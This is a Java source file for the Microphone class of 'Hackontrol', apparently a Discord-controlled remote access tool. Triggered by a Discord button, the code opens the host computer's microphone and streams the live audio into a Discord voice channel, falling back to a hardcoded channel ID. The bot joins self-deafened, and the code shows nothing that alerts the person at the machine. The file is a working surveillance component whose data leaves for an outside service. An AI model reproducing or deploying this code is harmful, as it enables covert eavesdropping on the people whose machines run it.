package com.khopan.hackontrol.utils;

import java.nio.ByteBuffer;
import java.util.List;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.utils.sendable.ISendable;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.managers.AudioManager;

public class Microphone {
	private SendHandler handler;
	private AudioManager audioManager;

	public void connect(ButtonContext context) {
		this.connect(context, true);
	}

	public void disconnect(ButtonContext context) {
		this.connect(context, false);
	}

	private void connect(ButtonContext context, boolean connect) {
		if((this.handler == null) != connect) {
			HackontrolMessage.boldDeletable(context.reply(), "Microphone is already " + (connect ? "connected" : "disconnected"));
			return;
		}

		Guild guild = context.getGuild();

		if(connect) {
			try {
				if(this.connectVoice(guild, context.reply(), true)) {
					context.deferEdit().queue();
				}
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}

			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disconnect?", QuestionType.YES_NO, () -> {
			try {
				this.connectVoice(guild, context.message(), false);
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}
		});
	}

	private boolean connectVoice(Guild guild, ISendable sender, boolean connect) throws Throwable {
		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.handler != null) {
			this.handler.close();
			this.handler = null;
		}

		if(!connect) {
			return true;
		}

		List<VoiceChannel> voiceChannelList = guild.getVoiceChannels();
		VoiceChannel channel;

		if(voiceChannelList.isEmpty()) {
			channel = guild.getVoiceChannelById(1230856739793145919L);
		} else {
			channel = voiceChannelList.get(0);
		}

		if(channel == null) {
			HackontrolError.message(sender, "No voice channels were found");
			return false;
		}

		this.handler = new SendHandler();
		this.audioManager.setSendingHandler(this.handler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
		return true;
	}

	private class SendHandler implements AudioSendHandler {
		private final TargetDataLine line;
		private final AudioInputStream stream;
		private final int size;

		private volatile boolean open;

		private SendHandler() throws Throwable {
			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
			this.line = (TargetDataLine) AudioSystem.getLine(info);
			this.line.open();
			this.line.start();
			this.stream = new AudioInputStream(this.line);
			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			this.open = true;
		}

		@Override
		public boolean canProvide() {
			return this.open;
		}

		@Override
		public ByteBuffer provide20MsAudio() {
			try {
				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
			} catch(Throwable Errors) {
				return ByteBuffer.allocate(0);
			}
		}

		private void close() throws Throwable {
			this.open = false;
			this.line.stop();
			this.line.close();
			this.stream.close();
		}
	}
}
